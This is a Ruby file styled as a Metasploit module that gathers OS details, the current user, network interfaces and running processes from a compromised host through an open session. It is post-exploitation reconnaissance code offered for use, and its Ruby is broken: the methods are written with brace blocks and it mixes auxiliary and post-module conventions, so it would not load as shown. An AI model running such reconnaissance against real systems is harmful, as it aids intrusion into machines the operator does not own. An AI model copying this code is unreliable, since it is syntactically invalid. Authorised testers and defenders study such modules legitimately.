#!/usr/bin/env ruby

class MetasploitModule < Msf::Auxiliary

  Rank = NormalRanking

    def initialize(info = {}) {
        super(update_info(info,
        'Name'     => 'information gathering script',
        'Description' => %q{
            The purpose of this script is to gather various pieces of information 
            from a target system once access is gained.
        },
        'Author'   => [ 'Emma LATEYRON' ],
        'License'  => MSF_LICENSE))

        register_options(
            [
                OptInt.new('SESSION', [true, 'Session ID'])
            ]
        )
    }
      
    def run {
        session_id = datastore['SESSION']

        print_status("Gathering system information from #{session_id}")

        gather_system_info
        gather_user_info
        gather_network_info
        gather_running_processes

    }

    def gather_system_info {
        sysinfo = session.sys.config.sysinfo
        print_good("OS: #{sysinfo['OS']}")
        print_good("Computer: #{sysinfo['Computer']}")
    }

    def gather_user_info {
        user = session.sys.config.getuid
        print_good("User: #{user}")
    }

    def gather_network_info {
        ifaces = session.net.config.interfaces
        ifaces.each { |iface|
        iface.addrs.each { |addr|
            print_good("Interface: #{iface.name}, IP: #{addr.addr}, Netmask: #{addr.netmask}, Broadcast: #{addr.broad}")
            }
        }
    }

    def gather_running_processes {
        procs = session.sys.process.get_processes
        procs.each { |proc|
        print_good("Process #{proc['pid']} - #{proc['name']}")
        }
    }
    
end
